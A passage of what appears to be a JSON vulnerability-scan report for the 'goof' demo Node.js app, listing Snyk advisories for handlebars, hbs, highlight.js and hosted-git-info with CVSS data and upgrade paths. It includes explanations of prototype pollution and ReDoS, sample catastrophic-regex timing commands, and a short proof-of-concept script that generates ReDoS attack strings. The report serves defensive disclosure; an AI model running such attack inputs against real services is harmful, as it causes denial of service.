\"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"istanbul-reports@1.4.0\",\n    \"handlebars@4.0.11\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"istanbul-reports@1.4.0\",\n    \"handlebars@4.0.14\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"handlebars\",\n  \"version\": \"4.0.11\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-002418"
            ],
            "nist": [
              "SC-8"
            ],
            "cweid": [
              "200"
            ],
            "cveid": [
              "2021-32822"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Information Exposure",
          "id": "SNYK-JS-HBS-1566555",
          "desc": "## Overview\n[hbs](https://www.npmjs.org/package/hbs) is an Express.js template engine plugin for Handlebars\n\nAffected versions of this package are vulnerable to Information Exposure. `hbs` mixes pure template data with engine configuration options through the `Express` render API. By overwriting internal configuration options a file disclosure vulnerability may be triggered in downstream applications.\n## Remediation\nThere is no fixed version for `hbs`.\n## References\n- [PoC and Explanation](https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/)\n",
          "impact": 0.3,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-08-17T11:02:48.815315Z\",\n  \"credit\": [\n    \"Agustin Gianni\"\n  ],\n  \"cvssScore\": 3.4,\n  \"description\": \"## Overview\\n[hbs](https://www.npmjs.org/package/hbs) is an Express.js template engine plugin for Handlebars\\n\\nAffected versions of this package are vulnerable to Information Exposure. `hbs` mixes pure template data with engine configuration options through the `Express` render API. By overwriting internal configuration options a file disclosure vulnerability may be triggered in downstream applications.\\n## Remediation\\nThere is no fixed version for `hbs`.\\n## References\\n- [PoC and Explanation](https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/)\\n\",\n  \"disclosureTime\": \"2021-08-17T10:50:41Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-HBS-1566555\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-32822\"\n    ],\n    \"CWE\": [\n      \"CWE-200\"\n    ],\n    \"GHSL\": [\n      \"GHSL-2021-020\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-08-17T14:14:00.467905Z\",\n  \"moduleName\": \"hbs\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"hbs\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2021-08-17T14:14:00.465869Z\",\n  \"references\": [\n    {\n      \"title\": \"PoC and Explanation\",\n      \"url\": \"https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"*\"\n    ]\n  },\n  \"severity\": \"low\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Information Exposure\",\n  \"severityWithCritical\": \"low\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\"\n  ],\n  \"upgradePath\": [],\n  \"isUpgradable\": false,\n  \"isPatchable\": false,\n  \"name\": \"hbs\",\n  \"version\": \"4.0.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2020-26237"
            ],
            "ghsaid": [
              "vfrc-7r7c-w9mx"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-HIGHLIGHTJS-1045326",
          "desc": "## Overview\n[highlight.js](https://www.npmjs.com/package/highlight.js) is a syntax highlighter written in JavaScript. It works in the browser as well as on the server. It works with pretty much any markup, doesn’t depend on any framework, and has automatic language detection.\n\nAffected versions of this package are vulnerable to Prototype Pollution. A malicious HTML code block can be crafted that will result in prototype pollution of the base object's prototype during highlighting. If you allow users to insert custom HTML code blocks into your page/app via parsing Markdown code blocks (or similar) and do not filter the language names the user can provide you may be vulnerable.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `highlight.js` to version 9.18.2, 10.1.2 or higher.\n## References\n- [GitHub Commit](https://github.com/highlightjs/highlight.js/commit/7241013ae011a585983e176ddc0489a7a52f6bb0)\n- [GitHub PR](https://github.com/highlightjs/highlight.js/pull/2636)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:N/A:H\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-11-25T12:50:16.634305Z\",\n  \"credit\": [\n    \"Vladimir Jimenez\",\n    \"Josh Goebel\",\n    \"Travis Ralston\"\n  ],\n  \"cvssScore\": 5.8,\n  \"description\": \"## Overview\\n[highlight.js](https://www.npmjs.com/package/highlight.js) is a syntax highlighter written in JavaScript. It works in the browser as well as on the server. It works with pretty much any markup, doesn’t depend on any framework, and has automatic language detection.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. A malicious HTML code block can be crafted that will result in prototype pollution of the base object's prototype during highlighting. If you allow users to insert custom HTML code blocks into your page/app via parsing Markdown code blocks (or similar) and do not filter the language names the user can provide you may be vulnerable.\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `highlight.js` to version 9.18.2, 10.1.2 or higher.\\n## References\\n- [GitHub Commit](https://github.com/highlightjs/highlight.js/commit/7241013ae011a585983e176ddc0489a7a52f6bb0)\\n- [GitHub PR](https://github.com/highlightjs/highlight.js/pull/2636)\\n\",\n  \"disclosureTime\": \"2020-11-24T22:58:41Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"9.18.2\",\n    \"10.1.2\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-HIGHLIGHTJS-1045326\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-26237\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-vfrc-7r7c-w9mx\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-11-25T17:05:14.721131Z\",\n  \"moduleName\": \"highlight.js\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"highlight.js\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-11-25T17:05:14.497065Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/highlightjs/highlight.js/commit/7241013ae011a585983e176ddc0489a7a52f6bb0\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/highlightjs/highlight.js/pull/2636\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=7.2.0 <9.18.2\",\n      \">=10.0.0 <10.1.2\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"typeorm@0.2.24\",\n    \"cli-highlight@2.1.4\",\n    \"highlight.js@9.18.1\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"typeorm@0.2.24\",\n    \"cli-highlight@2.1.4\",\n    \"highlight.js@9.18.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"highlight.js\",\n  \"version\": \"9.18.1\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , cli-highlight@2.1.4 , highlight.js@9.18.1 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": [
              "7wwv-vh3v-89cq"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-HIGHLIGHTJS-1048676",
          "desc": "## Overview\n[highlight.js](https://www.npmjs.com/package/highlight.js) is a syntax highlighter written in JavaScript. It works in the browser as well as on the server. It works with pretty much any markup, doesn’t depend on any framework, and has automatic language detection.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via Exponential and Polynomial catastrophic backtracking in multiple language highlighting.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `highlight.js` to version 10.4.1 or higher.\n## References\n- [GitHub Commit](https://github.com/highlightjs/highlight.js/commit/373b9d862401162e832ce77305e49b859e110f9c)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-12-06T09:34:39.383236Z\",\n  \"credit\": [\n    \"Unknown\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[highlight.js](https://www.npmjs.com/package/highlight.js) is a syntax highlighter written in JavaScript. It works in the browser as well as on the server. It works with pretty much any markup, doesn’t depend on any framework, and has automatic language detection.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via Exponential and Polynomial catastrophic backtracking in multiple language highlighting.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `highlight.js` to version 10.4.1 or higher.\\n## References\\n- [GitHub Commit](https://github.com/highlightjs/highlight.js/commit/373b9d862401162e832ce77305e49b859e110f9c)\\n\",\n  \"disclosureTime\": \"2020-12-04T16:47:20Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"10.4.1\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-HIGHLIGHTJS-1048676\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-7wwv-vh3v-89cq\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-06T16:34:07.402949Z\",\n  \"moduleName\": \"highlight.js\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"highlight.js\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-12-06T16:34:07.195287Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/highlightjs/highlight.js/commit/373b9d862401162e832ce77305e49b859e110f9c\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=9.0.0 <10.4.1\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"typeorm@0.2.24\",\n    \"cli-highlight@2.1.4\",\n    \"highlight.js@9.18.1\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"typeorm@0.2.24\",\n    \"cli-highlight@2.1.6\",\n    \"highlight.js@10.4.1\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"highlight.js\",\n  \"version\": \"9.18.1\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , cli-highlight@2.1.4 , highlight.js@9.18.1 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2021-23362"
            ],
            "ghsaid": [
              "43f8-2h32-f4cj"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-HOSTEDGITINFO-1088355",
          "desc": "## Overview\n[hosted-git-info](https://www.npmjs.org/package/hosted-git-info) is a Provides metadata and conversions from repository urls for Github, Bitbucket and Gitlab\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via regular expression `shortcutMatch ` in the `fromUrl` function in index.js. The affected regular expression exhibits polynomial worst-case time complexity.\r\n\r\n### PoC by Yeting Li\r\n```\r\nvar hostedGitInfo = require(\"hosted-git-info\")\r\nfunction build_attack(n) {\r\n    var ret = \"a:\"\r\n    for (var i = 0; i < n; i++) {\r\n        ret += \"a\"\r\n    }\r\n    return ret + \"!\";\r\n}\r\n\r\nfor(var i = 1; i <= 5000000; i++) {\r\n   if (i % 1000 == 0) {\r\n        var time = Date.now();\r\n        var attack_str = build_attack(i)\r\n       var parsedInfo = hostedGitInfo.fromUrl(attack_str)\r\n        var time_cost = Date.now() - time;\r\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `hosted-git-info` to version 3.0.8, 2.8.9 or higher.\n## References\n- [GitHub Commit](https://github.com/npm/hosted-git-info/commit/bede0dc38e1785e732bf0a48ba6f81a4a908eba3)\n",
          "impact": 0.5,
